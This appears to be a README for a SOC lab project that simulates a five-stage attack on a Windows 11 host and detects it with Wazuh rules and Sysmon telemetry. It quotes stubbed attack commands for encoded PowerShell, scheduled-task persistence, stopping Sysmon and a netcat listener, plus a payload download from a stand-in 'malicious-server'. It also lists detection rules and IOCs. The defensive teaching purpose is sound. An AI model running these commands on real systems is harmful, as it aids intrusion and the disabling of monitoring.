# 💻 Multi-Stage Cyber Attack Detection Using Wazuh SIEM & Sysmon

![MITRE ATT\&CK](https://img.shields.io/badge/MITRE-ATT%26CK-blue?logo=mitre)
![Detection Engineering](https://img.shields.io/badge/Detection-Engineering-yellow)
![SOC Lab Project](https://img.shields.io/badge/SOC-Lab-red)
![Windows](https://img.shields.io/badge/Windows-11-blue?logo=windows)
![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-green)

---

# Table of Contents

1. Project Overview
2. Key Security Outcomes
3. Lab Architecture
4. Telemetry Collection
5. Attack Flow Diagram
6. Attack Simulation
7. Stage 1 – Initial Access
8. Stage 2 – Execution
9. Stage 3 – Persistence
10. Stage 4 – Defense Evasion
11. Stage 5 – Command and Control
12. Detection Engineering
13. Correlation Rules
14. Threat Hunting Queries
15. Sample Detection Events
16. Indicators of Compromise (IOCs)
17. Attack Timeline
18. SOC Investigation Walkthrough
19. Detection Strategy
20. Real-World Threat Mapping
21. Purple Team Validation
22. Detection Coverage Matrix
23. SOC Investigation Workflow
24. Incident Response Actions
25. Repository Structure
26. Technologies Used
27. Skills Demonstrated
28. Future Improvements
29. Author

---

# Project Overview

This project demonstrates **end-to-end detection of a multi-stage cyber attack** using **Wazuh SIEM** and **Sysmon endpoint telemetry**.

The objective is to simulate a **realistic adversary attack chain** and demonstrate how a **Security Operations Center (SOC)** detects, correlates, and investigates malicious activity using centralized log monitoring and detection engineering.

The attack simulation replicates techniques commonly observed in real-world incidents mapped to **MITRE ATT&CK**.

### Dashboard Overview

📷 Screenshot Placeholder

```
screenshots/wazuh-dashboard-overview.png
```

---

# Key Security Outcomes

This project demonstrates the ability to:

• Deploy and configure a SIEM environment
• Collect and analyze endpoint telemetry
• Engineer custom detection rules
• Correlate multiple alerts into attack chains
• Conduct SOC-style investigations
• Map attacker behaviors to MITRE ATT&CK

---

# Lab Architecture

The lab simulates a simplified enterprise detection environment.

```
Kali Linux (Attacker)
        │
        │ Attack Simulation
        ▼
Windows 11 Victim
(Sysmon + Wazuh Agent)
        │
        │ Endpoint Telemetry
        ▼
Wazuh Manager
        │
        ▼
Wazuh Dashboard (SIEM)
```

### Architecture Diagram

📷 Screenshot Placeholder

```
screenshots/lab-architecture.png
```

---

# Telemetry Collection

To ensure **high-fidelity endpoint visibility**, Sysmon was deployed on the Windows endpoint.

Logs are forwarded to the Wazuh manager where they are parsed and analyzed.

### Key Telemetry Sources

| Sysmon Event ID | Description           |
| --------------- | --------------------- |
| 1               | Process Creation      |
| 3               | Network Connection    |
| 7               | Image Loaded          |
| 10              | Process Access        |
| 13              | Registry Modification |
| 22              | DNS Query             |

📷 Screenshot Placeholder

```
screenshots/sysmon-logs.png
```

---

# Attack Flow Diagram

The simulated attack follows the adversary lifecycle.

```
Initial Access
     │
     ▼
Encoded PowerShell
(T1059)
     │
     ▼
Recon Commands
(whoami / ipconfig)
     │
     ▼
Persistence
Scheduled Task (T1053)
     │
     ▼
Defense Evasion
Stop Sysmon (T1562)
     │
     ▼
C2 Channel
Netcat Reverse Shell (T1071)
```

📷 Screenshot Placeholder

```
screenshots/attack-flow.png
```

---

# Attack Simulation

The attack was launched from a Kali Linux attacker machine targeting a Windows 11 system with Sysmon installed.

---

# Stage 1 – Initial Access

### Attack Command

```powershell
powershell -enc <base64_payload>
```

### Description

This simulates PowerShell malware execution using Base64 encoding.

Attackers frequently encode commands to bypass detection.

MITRE Technique

```
T1059 – Command and Scripting Interpreter
```

### Detection

* Sysmon Event ID 1
* Command-line inspection
* Detection of `-enc`

📷 Screenshot Placeholder

```
screenshots/initial-access-alert.png
```

---

# Stage 2 – Execution

### Commands

```
whoami
net user
ipconfig
```

### Description

These commands perform **system reconnaissance**.

MITRE Technique

```
T1059 – Command Execution
```

Detection Source

```
Sysmon Event ID 1
```

📷 Screenshot Placeholder

```
screenshots/recon-commands.png
```

---

# Stage 3 – Persistence

### Command

```
schtasks /create /sc minute /tn updater /tr malware.exe
```

### Description

Creates a scheduled task to maintain persistence.

MITRE Technique

```
T1053 – Scheduled Task
```

Detection

* Sysmon Event ID 13
* Wazuh custom detection rule

📷 Screenshot Placeholder

```
screenshots/persistence-task.png
```

---

# Stage 4 – Defense Evasion

### Command

```
Stop-Service Sysmon
```

### Description

The attacker attempts to disable endpoint monitoring.

MITRE Technique

```
T1562 – Impair Defenses
```

Detection

* Windows service logs
* Wazuh rule detecting monitoring tampering

📷 Screenshot Placeholder

```
screenshots/defense-evasion.png
```

---

# Stage 5 – Command and Control

### Command

```
nc -lvnp 4444
```

### Description

Establishes a reverse shell.

MITRE Technique

```
T1071 – Application Layer Protocol
```

Detection

* Sysmon Event ID 3 network telemetry

📷 Screenshot Placeholder

```
screenshots/reverse-shell.png
```

---

# Detection Engineering

Custom Wazuh rules were developed to detect attacker behaviors.

### Encoded PowerShell Detection

```xml
<rule id="100100" level="12">
<if_sid>61600</if_sid>
<match>-enc</match>
<description>Encoded PowerShell command detected</description>
</rule>
```

---

### Scheduled Task Detection

```xml
<rule id="100101" level="10">
<if_sid>18107</if_sid>
<description>Suspicious scheduled task created</description>
</rule>
```

---

### Defense Evasion Detection

```xml
<rule id="100102" level="12">
<match>Stop-Service Sysmon</match>
<description>Attempt to disable monitoring</description>
</rule>
```

📷 Screenshot Placeholder

```
screenshots/custom-rule-alert.png
```

---

# Correlation Rules

```xml
<rule id="100200" level="15" frequency="3" timeframe="120">
<if_matched_sid>100100</if_matched_sid>
<if_matched_sid>100101</if_matched_sid>
<if_matched_sid>100102</if_matched_sid>
<description>Multi-stage attack behavior detected</description>
</rule>
```

📷 Screenshot Placeholder

```
screenshots/correlation-alert.png
```

---

# Threat Hunting Queries

### PowerShell Abuse

```
powershell AND ("-enc" OR "Invoke-WebRequest")
```

### Reverse Shell Detection

```
destination_port:4444
```

📷 Screenshot Placeholder

```
screenshots/threat-hunting.png
```

---

# Sample Detection Events

### Sysmon Event ID 1

```json
{
 "EventID": 1,
 "Image": "powershell.exe",
 "CommandLine": "powershell -enc aQBlAHgA...",
 "ParentImage": "explorer.exe",
 "User": "WIN11\\User"
}
```

📷 Screenshot Placeholder

```
screenshots/sysmon-event1.png
```

---

# Indicators of Compromise (IOCs)

| IOC Type | Indicator           | Description        |
| -------- | ------------------- | ------------------ |
| Process  | powershell.exe -enc | Encoded PowerShell |
| Command  | schtasks /create    | Persistence        |
| Service  | Stop-Service Sysmon | Defense Evasion    |
| Network  | Port 4444           | Reverse shell      |
| Tool     | nc.exe              | C2                 |

---

# Attack Timeline

| Time  | Event                       |
| ----- | --------------------------- |
| 10:12 | Encoded PowerShell executed |
| 10:13 | Recon commands executed     |
| 10:14 | Scheduled task created      |
| 10:15 | Reverse shell established   |
| 10:16 | Sysmon service targeted     |

📷 Screenshot Placeholder

```
screenshots/attack-timeline.png
```

---

# SOC Investigation Walkthrough

### Alert Triggered

```
Rule ID: 100100
Alert: Encoded PowerShell
Severity: High
```

---

### Step 1 – Process Tree Analysis

```
Parent: explorer.exe
Child: powershell.exe
CommandLine: powershell -enc <payload>
```

📷 Screenshot Placeholder

```
screenshots/process-tree.png
```

---

### Step 2 – Payload Inspection

Example decoded command:

```
Invoke-WebRequest http://malicious-server/payload.exe
```

---

### Step 3 – Log Pivoting

Analyst pivots to:

| Log Source            | Purpose             |
| --------------------- | ------------------- |
| Sysmon Event 3        | Network connections |
| Sysmon Event 22       | DNS queries         |
| Windows Security Logs | authentication      |

---

### Step 4 – Persistence Confirmation

```
schtasks /create /tn updater
```

---

### Step 5 – Confirm C2 Activity

```
Destination IP: 192.168.56.10
Port: 4444
Process: nc.exe
```

---

### Conclusion

Evidence confirms host compromise.

Recommended actions:

• isolate system
• terminate malicious process
• remove persistence
• reset credentials

---

# Detection Strategy

The project focuses on **behavior-based detection** instead of static signatures.

Detection focuses on:

| Behavior             | Detection Method          |
| -------------------- | ------------------------- |
| Encoded PowerShell   | command-line inspection   |
| Persistence creation | scheduled task monitoring |
| Defense evasion      | service stop detection    |
| C2 communication     | unusual network ports     |

---

# Real-World Threat Mapping

The techniques simulated here are used by real adversaries.

| Threat Actor            | Observed Technique          |
| ----------------------- | --------------------------- |
| APT29                   | PowerShell encoded payloads |
| FIN7                    | Scheduled task persistence  |
| Cobalt Strike operators | reverse shells              |

These techniques align with behavior documented in the MITRE ATT&CK framework.

---

# Purple Team Validation

| Technique          | Command               | Detection        |
| ------------------ | --------------------- | ---------------- |
| Encoded PowerShell | `powershell -enc`     | Alert Triggered  |
| Recon              | `whoami`              | Logged           |
| Persistence        | `schtasks`            | Alert Triggered  |
| Defense Evasion    | `Stop-Service Sysmon` | Alert Triggered  |
| Reverse Shell      | `nc -lvnp 4444`       | Network Detected |

📷 Screenshot Placeholder

```
screenshots/purple-team-validation.png
```

---

# Detection Coverage Matrix

| MITRE Technique | Source          | Detection            |
| --------------- | --------------- | -------------------- |
| T1059           | Sysmon Event 1  | PowerShell detection |
| T1053           | Sysmon Event 13 | Scheduled task rule  |
| T1562           | Windows Logs    | service tampering    |
| T1071           | Sysmon Event 3  | network detection    |

---

# SOC Investigation Workflow

```
Attacker Action
     │
     ▼
Sysmon Telemetry
     │
     ▼
Wazuh Rule Trigger
     │
     ▼
SIEM Alert
     │
     ▼
SOC Investigation
     │
     ▼
Incident Response
```

📷 Screenshot Placeholder

```
screenshots/investigation-timeline.png
```

---

# Incident Response Actions

1. Isolate affected host
2. Terminate malicious processes
3. Remove persistence
4. Reset credentials
5. Conduct forensic investigation

---

# Repository Structure

```
project-root
│
├── screenshots
│   ├── wazuh-dashboard-overview.png
│   ├── lab-architecture.png
│   ├── initial-access-alert.png
│   ├── reverse-shell.png
│   ├── correlation-alert.png
│
├── rules
│   └── custom_rules.xml
│
├── sysmon-config
│   └── sysmonconfig.xml
│
└── README.md
```

---

# Technologies Used

• Wazuh SIEM
• Sysmon
• Kali Linux
• Windows 11
• Netcat

---
